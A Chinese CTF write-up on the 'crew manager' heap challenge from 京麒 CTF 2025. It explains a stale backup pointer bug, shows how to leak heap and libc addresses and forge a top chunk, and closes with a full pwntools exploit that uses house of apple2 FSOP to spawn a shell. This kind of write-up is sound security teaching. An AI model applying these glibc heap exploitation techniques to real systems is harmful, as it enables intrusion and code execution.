---
date: 2025-07-10 10:21:59
layout: post
title: 京麒 CTF 2025 writeup
subtitle: 
description: >-
    没错，到了快决赛的时候才写初赛 writeup，我绝对不是拖延症
image: >-
  /assets/img/uploads/star-rail-trio.jpg
optimized_image: >-
  /assets/img/uploads/star-rail-trio.jpg
category: half-finished
tags:
  - jqctf 2025
  - write to bk
  - stack exploitation
  - kernel pwn
  - spray file struct
  - change busybox permissions
  - malicious shellcode write
author: rosayxy
paginate: true
---

比赛的时候做了堆题，看了 kernel 题但是没解出来ww    

## crew manager
这个题不难，和今年 CodeGate Quals 的 [Secret Note](https://rosayxy.github.io/codegate-quals-2025-writeup/) 是一个漏洞，具体来说，**都是利用可以读写指向内容的未清空的 bk 搞事情**

### 漏洞
题目主要结构体如下
```c
struct crew{
  unsigned long long backup_size;
  char* backup_ptr;
  char name[0x20];
  char department[0x18];
  unsigned level;
  unsigned idx;
  unsigned time_0;
}
```

漏洞部分代码如下
```c
      __printf_chk(2LL, "Backup size (32-1280), default size 32: ");
      *(_QWORD *)v6 = 0x20LL;
      if ( (unsigned int)__isoc99_scanf("%zu", &size) == 1 )
      {
        do
          v8 = getc(stdin);
        while ( v8 != -1 && v8 != 10 );
        v9 = size;
        if ( size - 32 > 1248 )                 // size - 32 >= 0
        {
          puts("Invalid size.");
          return v17 - __readfsqword(0x28u);
        }
        *(_QWORD *)v6 = size;
        backup = calloc(1uLL, v9);
        *((_QWORD *)v6 + 1) = backup;
        // ...
      }
```
这里 `backup_size` 一开始赋值的是 0x20 而非0，然后 backup，所以如果我们输入一个大于 32 + 1248 的数，它 backup_size 是原先的 0x20，backup_ptr 也不会被清空，所以我们可以利用这个漏洞，读写 backup_ptr 指向的内容


### 打法
还是像 [CodeGate 这个 writeup](https://rosayxy.github.io/codegate-quals-2025-writeup/) 描述的打法，首先我们搞到一个 unsorted bin 的堆块，这样它的 bk 是 libc 地址，正好指向 main_arena 的 top_chunk 域

然后我们利用漏洞，让程序把该 bk 当成一个指向 backup 的内容的指针，利用原有的功能读出来值，也就是 top_chunk 地址，**从而拿到 heap leak**

我们可以写入该地址，也就是 top_chunk 的位置，从而造成堆上任意地址分配，也就是堆上任意地址读写

**对于 libc leak**，下一步，我们耗尽 unsorted bin chunk，从而所有堆块都需要从 top_chunk 里面切出来，然后我们在堆上某个位置伪造一个 top_chunk(注意伪造的 size，需要页对齐)，利用写入 main_arena 的 top_chunk 字段的方式，让该字段指向伪造的 top chunk

然后我们怎么 leak libc 呢？就把该 top chunk 的 0x8 offset 写成一个堆地址，该堆地址指向堆上残留的 libc 地址，我们接下来依次分配结构体的时候，backup_size 继续传一个很大的数，让他把 backup_ptr 当成我们恶意构造的地址，读出来该地址的内容，也就是 libc leak

此外，在之前步骤中，我们也有一个副产物，是一个堆重叠原语，可以改 `backup_ptr` 的值指向任意地址，也就是一个任意地址读写

我们利用该原语去写 `IO_list_all` 地址，打 house of apple2 就行了

### exp
```py
from pwn import*
context(log_level='debug', arch='amd64', os='linux')
p = process("./pwn")
# p = remote("39.106.16.204", 59253)
libc = ELF("./libc.so")
def global_ops_init(content):
    p.recvuntil(b"Choice: ")
    p.sendline(b"4")
    p.recvuntil(b"> ")
    p.sendline(b"1")
    p.recvuntil("data: ")
    p.send(content)


def global_ops_hash():
    p.recvuntil(b"Choice: ")
    p.sendline(b"4")
    p.recvuntil(b"> ")
    p.sendline(b"4")

def global_ops_print():
    p.recvuntil(b"Choice: ")
    p.sendline(b"4")
    p.recvuntil(b"> ")
    p.sendline(b"2")

def init_crew(idx, name, department, backup_size, backup, is_backup=True):
    p.recvuntil(b"Choice: ")
    p.sendline(b"1")
    p.recvuntil(b"Enter index: ")
    p.sendline(str(idx).encode())
    p.recvuntil("Name: ")
    p.send(name)
    p.recvuntil("Department: ")
    p.send(department)
    p.recvuntil("size 32: ")
    p.sendline(str(backup_size).encode())
    if is_backup:
        p.recvuntil("data: ")
        p.send(backup)

def delete_crew(idx):
    p.recvuntil(b"Choice: ")
    p.sendline(b"1")
    p.recvuntil(b"Enter index: ")
    p.sendline(str(idx).encode())
    p.recvuntil("> ")
    p.sendline(b"4")

def view_backup(idx):
    p.recvuntil(b"Choice: ")
    p.sendline(b"3")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil("> ")
    p.sendline(b"1")

def edit_backup(idx, backup):
    p.recvuntil(b"Choice: ")
    p.sendline(b"3")
    p.recvuntil(b"Index: ")
    p.sendline(str(idx).encode())
    p.recvuntil(b"> ")
    p.sendline(b"2")
    p.recvuntil("content: ")
    p.send(backup)

global_ops_init(b"3"*512)
init_crew(0, b"1"*20 + b"\n", b"2"*20 + b"\n", 1280, b"3"*40 + b"\n")
# 先搞一个 unsorted bin
init_crew(1, b"1"*20 + b"\n", b"2"*20 + b"\n", 1280, b"3"*40 + b"\n")
delete_crew(0)
init_crew(2, b"1"*20 + b"\n", b"2"*20 + b"\n", 80, b"3"*40 + b"\n")
gdb.attach(p)
pause()
init_crew(3, b"1"*20 + b"\n", b"2"*20 + b"\n", 1300, b"3", False)
view_backup(3)
p.recvuntil("3: ")
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("heap_leak: " + hex(heap_leak))
heap_base = heap_leak - 0xfa0
# libc leak
# 在某个堆块的 content 中伪造 top chunk，让它指向一个 libc 地址
# stuff a fake top chunk into the heap
init_crew(4, b"1"*20 + b"\n", b"2"*20 + b"\n", 0x3c0, p64(0) + p64(0x2061) + b"a"*8 + p64(heap_base + 0x588)+b"\n")
new_topchunk = heap_base + 0x660
edit_backup(3, p64(new_topchunk))
init_crew(5, b"1"*20 + b"\n", b"2"*20 + b"\n", 1300, b"3", False)
view_backup(5)
p.recvuntil("5: ")
libc_leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("libc_leak: " + hex(libc_leak))
# 0x7f5cc916bb20 - 0x7f5cc8f68000
libc_base = libc_leak - 0x203b20
log.info("libc_base: " + hex(libc_base))
# edit 4 的 backup
io_list_all = libc_base + 0x2044c0
fake_io_addr = heap_base + 0xaa0
edit_backup(4,p64(0) + p64(0x71) + p64(32) + p64(io_list_all))
edit_backup(5, p64(fake_io_addr))
system_addr=libc_base+libc.sym["system"]
fake_io_file=b"  sh;".ljust(0x8,b"\x00") 
fake_io_file+=p64(0)*3+p64(1)+p64(2)
fake_io_file=fake_io_file.ljust(0x30,b"\x00")
fake_io_file+=p64(0)
fake_io_file=fake_io_file.ljust(0x68,b"\x00")
fake_io_file+=p64(system_addr)
fake_io_file=fake_io_file.ljust(0x88,b"\x00")
fake_io_file+=p64(libc_base+0x205700)
fake_io_file=fake_io_file.ljust(0xa0,b"\x00")
fake_io_file+=p64(fake_io_addr)
fake_io_file=fake_io_file.ljust(0xd8,b"\x00")
fake_io_file+=p64(0x202228+libc_base) # 使得可以调用 _IO_wfile_overflow
fake_io_file+=p64(fake_io_addr)
edit_backup(1, fake_io_file)
#trigger
# gdb.attach(p)
# pause()
p.recvuntil(b"Choice: ")
p.sendline("5")

p.interactive()
```

## old wine
